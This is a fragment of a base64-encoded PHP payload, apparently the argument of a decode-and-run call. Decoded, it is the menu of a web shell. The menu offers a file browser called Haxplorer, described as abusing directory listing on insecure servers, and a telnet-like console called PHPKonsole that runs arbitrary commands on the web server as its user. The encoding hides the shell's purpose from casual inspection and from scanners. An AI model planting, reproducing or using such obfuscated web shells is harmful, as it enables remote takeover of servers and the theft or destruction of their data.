0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPgoKCSA8dHI+CgoJICA8dGQgd2lkdGg9IjEwMCUiIGNsYXNzPSJib3JkZXIiPgoKCSAgIDxjZW50ZXI+Jm5ic3A7Ljo6IDw/cGhwIGVjaG8gJHNjcmlwdFRpdGxlID8+IE1haW4gTWVudSA6Oi4mbmJzcDs8L2NlbnRlcj4KCgkgIDwvdGQ+CgoJIDwvdHI+CgoJPC90YWJsZT4KCgk8YnI+CgogCTxjZW50ZXI+CgoJPHRhYmxlIGJvcmRlcj0iMCIgTk9XUkFQPgoKIAkgPHRyPgoKCSAgPHRkIHZhbGlnbj0idG9wIiBjbGFzcz0ic2lsdmVyIGJvcmRlciI+CgogICAgICAgICAgIDw/cGhwIGVjaG8gYnVpbGRVcmwoIHNwKDIpLiI8Zm9udCBjb2xvcj1cIm5hdnlcIj48c3Ryb25nPj09PiBIYXhwbG9yZXIgPD09PC9zdHJvbmc+PC9mb250PiIsICJjbWQ9ZGlyJmRpcj0uIikuc3AoMik7ID8+CgoJICA8L3RkPgoKIAkgIDx0ZCBzdHlsZT0iQk9SREVSLVRPUDogc2lsdmVyIDFweCBzb2xpZDsiIHdpZHRoPTM1MCBOT1dSQVA+CgoJICAgSGF4cGxvcmVyIGlzIGEgc2VydmVyIHNpZGUgZmlsZSBicm93c2VyIHdpY2ggKGFiKXVzZXMgdGhlIGRpcmVjdG9yeSBvYmplY3QgdG8gbGlzdAoKIAkgICB0aGUgZmlsZXMgYW5kIGRpcmVjdG9yaWVzIHN0b3JlZCBvbiBhIHdlYnNlcnZlci4gVGhpcyBoYW5keSB0b29scyBhbGxvd3MgeW91IHRvIG1hbmFnZQoKIAkgICBmaWxlcyBhbmQgZGlyZWN0b3JpZXMgb24gYSB1bnNlY3VyZSBzZXJ2ZXIgd2l0aCBwaHAgc3VwcG9ydC48YnI+PGJyPlRoaXMgZW50aXJlIHNjcmlwdAoKIAkgICBpcyBjb2RlZCBmb3IgdW5zZWN1cmUgc2VydmVycywgaWYgeW91ciBzZXJ2ZXIgaXMgc2VjdXJlZCB0aGUgc2NyaXB0IHdpbGwgaGlkZSBjb21tYW5kcwoKIAkgICBvciB3aWxsIGV2ZW4gcmV0dXJuIGVycm9ycyB0byB5b3VyIGJyb3dzZXIuLi48YnI+PGJyPgoKCSAgPC90ZD4KCgkgPC90cj4KCiAJIDx0cj4KCgkgIDx0ZCB2YWxpZ249InRvcCIgY2xhc3M9InNpbHZlciBib3JkZXIiPgoKICAgICAgICAgICA8P3BocCBlY2hvIGJ1aWxkVXJsKCBzcCgyKS4iPGZvbnQgY29sb3I9XCJuYXZ5XCI+PHN0cm9uZz49PT4gUEhQS29uc29sZSA8PT08L3N0cm9uZz48L2ZvbnQ+IiwgImNtZD1jb24iKS5zcCgyKTsgPz4KCgkgIDwvdGQ+CgogCSAgPHRkIHN0eWxlPSJCT1JERVItVE9QOiBzaWx2ZXIgMXB4IHNvbGlkOyIgd2lkdGg9MzUwIE5PV1JBUD4KCgkgICA8YnI+UEhQS29uc29sZSBpcyBqdXN0IGEgbGl0dGxlIHRlbG5ldCBsaWtlIHNoZWxsIHdpY2ggYWxsb3dzIHlvdSB0byBydW4gY29tbWFuZHMgb24gdGhlIHdlYnNlcnZlci4KCgkgICAgV2hlbiB5b3UgcnVuIGNvbW1hbmRzIHRoZXkgd2lsbCBydW4gYXMgdGhlIHdlYnNlcnZlcnMgVXNlcklELiBUaGlzIHNob3VsZCB3b3JrIHBlcmZlY3RseQoKCSAgICBmb3IgbWFuYWdpbmcgZmlsZXMsIGxpa2UgbW92aW5nLCBjb3B5aW5nIGV0Yy4gSWYgeW91J3JlIHVzaW5nIGEgbGludXggc2VydmVyLCBzeXN0ZW0gY29tbWFuZHMKCgkgICAgc3VjaCBhcyBscywgbXYgYW5kIGNwIHdpbGwgYmUgYXZhaWxhYmxlIGZvciB5b3UuLi4gPGJyPjxicj5UaGlzIGZ1bmN0aW9uIHdpbGwgb25seSB3b3JrIGlmIHRoZQoKCSAgICBzZXJ2ZXIgc3VwcG9ydHMgcGhwIGFuZCB0aGUgZXhlY3V0ZSBjb21tYW5kcy4uLjxicj48YnI+CgoJICA8L3RkPgoKCSA8L3RyPgoKICAgICAgICA8L3RhYmxlPgoKCTwvY2VudGVyPgoKCTxicj4KCiAgICAgPD9waHAKCn0KCgoKaWYgKCRjbWQgIT0gImRvd25sIikgewoKCWlmICggJGlzTWFpbk1lbnUgIT0gdHJ1ZSkgewoKIAkJPz4KCgkJPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+CgoJCSA8dHI+CgoJCSAgPHRkIHdpZHRoPSIxMDAlIiBzdHlsZT0iY2xhc3M9InNpbHZlciBib3JkZXIiPgoKCQkgICA8Y2VudGVyPjxzdHJvbmc+CgoJCSAgICAmbmJzcDsmbmJzcDs8P3BocCBlY2hvIGJ1aWxkVXJsKCI8Zm9udCBjb2xvcj1cIm5hdnlcIj5bJm5ic3A7TWFpbiBNZW51Jm5ic3A7XSAgPC9mb250PiIsICJjbWQ9JmRpcj0iKTsgICAgICA/PiZuYnNwOyZuYnNwOwoKCQkgICAgJm5ic3A7Jm5ic3A7PD9waHAgZWNobyBidWlsZFVybCgiPGZvbnQgY29sb3I9XCJuYXZ5XCI+WyZuYnNwO1BIUEtvbnNvbGUmbmJzcDtdIDwvZm9udD4iLCAiY21kPWNvbiIpOyAgICAgICAgPz4mbmJzcDsmbmJzcDsKCiAgICAgICAgICAgICAgICAgICAgJm5ic3A7Jm5ic3A7PD9waHAgZWNobyBidWlsZFVybCgiPGZvbnQgY29sb3I9XCJuYXZ5XCI+WyZuYnNwO0hheHBsb3JlciZuYnNwO10gIDwvZm9udD4iLCAiY21kPWRpciZkaXI9LiIpOyAgPz4gJm5ic3A7Jm5ic3A7CgogCQkgICA8L3N0cm9uZz48L2NlbnRlcj4KCgkJICA8L3RkPgoKCQkgPC90cj4KCgkJPC90YWJsZT4KCgkJPGJyPgoKCQk8P3BocAoKfQoKCT8+CgoJPHRhYmxlIHdpZHRoPTEwMCUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPgoKCSA8dHI+CgoJICA8dGQgd2lkdGg9IjEwMCUiIGNsYXNzPSJzaWx2ZXIgYm9yZGVyIj4KCgkgICA8Y2VudGVyPiZuYnNwOzw/cGhwIGVjaG8gJHNjcmlwdGlkZW50ID8+IC0gPD9waHAgZWNobyAkc2NyaXB0dmVyID8+IC0gPD9waHAgZWNobyAkc2NyaXB0ZGF0ZSA/PiZuYnNwOzwvY2VudGVyPgoKCSAgPC90ZD4KCgkgPC90cj4KCgk8L3RhYmxlPgoKIAkgICA8L3RkPgoKICA8L3RyPgoKIDwvdGFibGU+CgoKCiAgPD9waHAKCiB9CgoKCj8+IAoKCgoKCgoK'));
